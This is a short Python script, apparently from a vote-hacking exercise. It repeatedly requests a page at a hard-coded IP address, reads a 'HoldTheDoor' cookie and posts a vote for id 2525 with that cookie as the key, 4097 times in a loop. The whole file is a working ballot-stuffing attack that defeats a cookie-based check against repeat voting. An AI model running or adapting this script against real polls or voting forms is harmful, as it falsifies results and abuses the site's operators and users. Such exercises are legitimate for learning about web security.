#!/usr/bin/python3
import requests

url = "http://158.69.76.135/level1.php"
print("Connecting", end='')
for i in range(4097):
    resp = requests.get(url)
    cookie = resp.cookies['HoldTheDoor']
    data = {'id': 2525, 'holdthedoor': 'submit', 'key': str(cookie)}
    requests.post(url, data=data, cookies={'HoldTheDoor': str(cookie)})
    print(".", end='')
print("Success.\nVote compled.")
